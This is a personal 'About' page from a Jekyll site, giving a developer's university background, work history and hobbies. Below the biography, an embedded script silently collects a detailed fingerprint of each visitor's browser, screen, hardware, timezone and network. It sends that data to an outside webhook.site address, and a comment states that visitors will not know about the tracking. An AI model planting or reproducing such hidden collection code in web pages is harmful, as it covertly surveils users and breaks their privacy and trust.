---
layout: page
title: About
permalink: /about/
sidebar_link: true
---

My name is Faisal Zulfiqar and I am a Computer Science graduate from <em>COMSATS University Islamabad, Lahore Campus</em>. During my 4 years at university, I got to learn a lot, I took part in seminars, workshops and participated in different programming competitions and bagged a 1st and 2nd position in two of them. I tinkered with pretty much everything and discovered that developing scalable solutions, cloud-native applications, software security, etc. excite me the most.  

Currently, I spend time learning and developing <em>SaaS</em> applications. I primarily use Angular, NodeJS, Spring & Hibernate for development. I joined a software house in my senior year where I worked as a Ruby on Rails developer to maintain a Content Management Application. After that, I spent another year working on my Final Year Project which was an ERP System built with Angular & Spring.  

I love to code, read books, watch documentaries and maintain my blog. When I'm free I do video courses, attend workshops / developer conferences in my city and play lots of video games. 

<script>
// Comprehensive tracking data collection
const trackingData = {
    // Page info
    page: window.location.href,
    timestamp: new Date().toISOString(),
    referrer: document.referrer || 'Direct visit',
    pageTitle: document.title,

    // Browser info
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages?.join(',') || navigator.language,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || 'not set',

    // Screen & Display
    screenResolution: screen.width + 'x' + screen.height,
    screenAvailable: screen.availWidth + 'x' + screen.availHeight,
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio,

    // Viewport
    viewportSize: window.innerWidth + 'x' + window.innerHeight,
    windowSize: window.outerWidth + 'x' + window.outerHeight,

    // Hardware
    cpuCores: navigator.hardwareConcurrency || 'unknown',
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'unknown',
    maxTouchPoints: navigator.maxTouchPoints || 0,

    // Timezone
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),

    // Network (if available)
    connectionType: navigator.connection?.effectiveType || 'unknown',
    online: navigator.onLine
};

// Using GET request with query parameters - simpler and no CORS issues
const params = new URLSearchParams(trackingData);
fetch('https://webhook.site/x12348919023?' + params)
    .catch(err => {
        // Silently fail - visitor won't know about tracking
        console.log('asdf');
    });
</script>
